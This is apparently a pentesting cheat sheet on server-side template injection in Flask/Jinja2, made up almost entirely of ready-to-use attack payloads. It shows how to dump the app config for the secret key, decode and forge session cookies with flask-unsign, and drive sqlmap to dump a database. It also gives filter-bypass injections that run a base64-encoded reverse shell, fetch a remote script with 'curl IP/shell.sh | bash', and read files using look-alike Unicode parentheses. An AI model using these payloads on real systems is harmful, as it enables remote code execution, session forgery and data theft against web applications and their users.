# Server side template injection
## Flask Jinja2 
Get the secret key
```txt
{{ config }}
```
Decrypt the cookie
```bash
flask-unsign --decode --cookie 'eyJsb2dnZWRfaW4iOmZhbHNlfQ.XDuWxQ.E2Pyb6x3w-NODuflHoGnZOEpbH8'
```
SQLi in flask session with sqlmap
```bash
sqlmap http://1.1.1.1/sqli --eval "from flask_unsign import session as s; session = s.sign({'uid': session}, secret='SecretExfilratedFromTheMachine')" --cookie="session=*" --dump
```
Bypass filtered ->  `'` `_` `.` `{{}}` `if` `for` 
```python
{% with abuqasem=request["application"]["\x5f\x5fglobals\x5f\x5f"]["\x5f\x5fbuiltins\x5f\x5f"]["\x5f\x5fimport\x5f\x5f"]("os")["popen"]("echo <Base64EncodedReverseShellCommand> | base64 -d | bash -i")["read"]() %}abuqasem{% endwith %}
```
To exploit SSTI by image upload
```python
{% with abuqasem=request["application"]["__globals__"]["__builtins__"]["__import__"]("os")["popen"]("curl IP/shell.sh | bash")["read"]() %}
{{ abuqasem }}
{% endwith %}
```
Bypass filtered -> `()`
```python
# This was injected in an email field
"{{request.application['__globals__'].__builtins__.__import__﹙'os'﹚.popen﹙'cat flag.txt'﹚.read﹙﹚}}"@deafcon.com
```
> Link: https://unicode-search.net/unicode-namesearch.pl?term=PARENTHESIS
### Further reading
- [https://hackmd.io/@Chivato/HyWsJ31dI](https://hackmd.io/@Chivato/HyWsJ31dI)  
-  [https://chowdera.com/2020/12/20201221231521371q.html](https://chowdera.com/2020/12/20201221231521371q.html)  
-  [https://jinja.palletsprojects.com/en/2.10.x/templates](https://jinja.palletsprojects.com/en/2.10.x/templates)/
 - [https://book.hacktricks.xyz/pentesting/pentesting-web/flask](https://book.hacktricks.xyz/pentesting/pentesting-web/flask)
